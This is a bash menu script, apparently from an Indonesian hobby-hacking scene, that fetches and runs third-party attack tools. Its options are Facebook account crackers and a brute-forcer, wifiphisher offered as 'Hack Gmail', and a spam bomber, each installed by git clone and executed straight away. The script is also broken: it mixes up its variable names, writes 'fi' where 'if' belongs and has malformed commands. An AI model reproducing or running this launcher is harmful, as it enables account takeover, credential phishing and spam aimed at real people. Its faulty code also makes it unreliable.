#!/bin/bash
bi='\033[34;1m' #biru
i='\033[32;1m' #ijo
pur='\033[35;1m' #purple
cy='\033[36;1m' #cyan
me='\033[31;1m' #merah
pu='\033[37;1m' #purple
ku='\033[33;1m' #kuning
clear
echo $cy"●▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩"$ku"۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬●"
    echo $ku"  Author" :$i"</>Dark4127</>           "
   echo  $ku "Youtube" :$i" MCN OFFICIAL       "
echo $ku"●▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩"$cy"۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬●"
echo $cy"[1]" $cy"۩ "$ku"Dark Fb Premium"
echo $cy"[2]" $cy"۩ "$ku"Dark Fb Setan"
echo $cy"[3]" $cy"۩ "$ku"Hack Facebook Target"
echo $cy"[4]" $cy"۩ "$ku"Hack Gmail"
echo $cy"[5]" $cy"۩ "$ku"Boom Spam"
echo $me"[00]"$cy"۩ "$me"Keluar"
read -p "lolcat@darkgans>" pilih
if
[ $pill = 1 ]
then
sleep 1
clear
git clone https://github.com/kumpulanremaja/darkfb
cd darkfb
pip2 install --upgrade pip
python2 fb.py
fi

if
[ $pill = 2 ]
then
sleep 1
clear
git clone https://github.com/pashayogi/SETAN
pip2 install mechanize
pip install requests
python2 SETAN.py
fi

fi
[ $pilih = 3 ]
then
git clone https://github.com/IqbalzNoobs/fb-brute
cd fb-brute
chmod +x brute.py
python2 brute.py
fi

if
[ $pilih = 4 ]
then
sleep 1
clear
apt-get install python python-pip python-setuptools
pip install scapy
git clone https://github.com/wifiphisher/wifiphisher.git
cd wifiphisher<
python setup.py install
cd wifiphisher
python wifiphisher.py
fi

if
[ $pilih = 5 ]
then
git clone https://github.com/Amriez/gcospam
cd gcospam
sh install.sh
sh gco.sh
fi

if
[ $pilih = 00 ]
clear
exit
